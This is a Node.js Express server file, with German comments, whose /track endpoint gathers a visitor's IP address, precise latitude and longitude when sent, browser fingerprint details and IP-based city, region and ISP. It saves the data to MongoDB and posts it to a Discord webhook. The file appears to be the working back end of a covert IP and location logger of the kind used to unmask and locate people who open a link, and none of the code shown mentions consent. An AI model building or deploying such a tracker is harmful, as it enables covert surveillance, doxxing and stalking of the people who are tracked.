// server.js
require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

// WICHTIG: hinter Proxy (Render)
app.set('trust proxy', true);

// ENV
const { DISCORD_WEBHOOK_URL, MONGODB_URI } = process.env;

// Middleware
app.use(express.json());
app.use(express.static('public'));

// MongoDB (Atlas)
if (!MONGODB_URI) {
  console.error('FEHLER: MONGODB_URI nicht gesetzt.');
}
mongoose.connect(MONGODB_URI, { })
  .then(() => console.log('MongoDB verbunden'))
  .catch(err => console.error('MongoDB-Verbindungsfehler:', err.message));

const DataSchema = new mongoose.Schema({ data: Object, timestamp: Date });
const Data = mongoose.model('Data', DataSchema);

// IP ermitteln (Proxy-freundlich)
function getClientIp(req) {
  const xf = req.headers['x-forwarded-for'];
  if (xf) {
    const first = Array.isArray(xf) ? xf[0] : String(xf).split(',')[0];
    return first.trim().replace(/^::ffff:/, '');
  }
  return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
}

// Healthcheck (optional für Render)
app.get('/health', (_, res) => res.send('ok'));

// Tracking
app.get('/track', async (req, res) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const timestamp = new Date().toISOString();

  const {
    lat, lon, language, languages, cookies, screen, window: win,
    timezone, platform, hardwareConcurrency, deviceMemory, connection,
    referrer
  } = req.query;

  // Standort
  let location = {};
  if (lat && lon) {
    location = { latitude: lat, longitude: lon };
  } else {
    try {
      // ip-api.com: Client-IP nutzen, nicht die Server-IP
      const r = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 4000 });
      if (r?.data?.status === 'success') {
        location = {
          city: r.data.city,
          region: r.data.regionName || r.data.region,
          country: r.data.country,
          latitude: r.data.lat,
          longitude: r.data.lon,
          isp: r.data.isp
        };
      }
    } catch (e) {
      console.error('IP-Geolocation-Fehler:', e.message);
    }
  }

  const collectedData = {
    ip,
    userAgent,
    timestamp,
    location,
    browserData: {
      language, languages, cookies, screen, window: win, timezone,
      platform, hardwareConcurrency, deviceMemory, connection, referrer
    },
    rawQuery: req.query
  };

  // in Mongo speichern (Fehler nicht blockieren)
  try {
    await new Data({ data: collectedData, timestamp: new Date() }).save();
  } catch (e) {
    console.error('Mongo-Speicherfehler:', e.message);
  }

  // an Discord posten
  if (DISCORD_WEBHOOK_URL) {
    try {
      const content = `📡 **Neuer Track** — ${timestamp}`;
      const embeds = [{
        title: 'Tracking-Daten',
        color: 0x2b90d9,
        fields: [
          { name: 'IP', value: String(ip || '–'), inline: true },
          { name: 'User-Agent', value: userAgent.slice(0, 256) || '–', inline: false },
          { name: 'Zeitzone', value: String(timezone || '–'), inline: true },
          { name: 'Referrer', value: String(referrer || '–'), inline: false },
          { name: 'Language(s)', value: String(language || languages || '–').slice(0, 256), inline: true },
          { name: 'Platform', value: String(platform || '–'), inline: true },
          { name: 'HW / RAM', value: `Cores: ${hardwareConcurrency || '–'} | RAM: ${deviceMemory || '–'}`, inline: true },
          { name: 'Screen', value: String(screen || '–').slice(0, 256), inline: false },
          { name: 'Window', value: String(win || '–').slice(0, 256), inline: false },
          { name: 'Netz', value: String(connection || '–').slice(0, 256), inline: false },
          {
            name: 'Location',
            value:
              (location.latitude && location.longitude)
                ? `Lat, Lon: ${location.latitude}, ${location.longitude}\n${location.city || ''} ${location.region || ''} ${location.country || ''}${location.isp ? `\nISP: ${location.isp}` : ''}`
                : (location.city || location.country ? `${location.city || ''} ${location.region || ''} ${location.country || ''}` : '–'),
            inline: false
          }
        ],
        timestamp
      }];

      await axios.post(DISCORD_WEBHOOK_URL, { content, embeds }, { timeout: 5000 });
    } catch (e) {
      console.error('Discord-Webhook-Fehler:', e.response?.status, e.response?.data || e.message);
    }
  } else {
    console.warn('Kein DISCORD_WEBHOOK_URL gesetzt – überspringe Discord-Post.');
  }

  res.send('Daten empfangen');
});

app.listen(port, () => {
  console.log(`Server läuft auf http://localhost:${port}`);
});





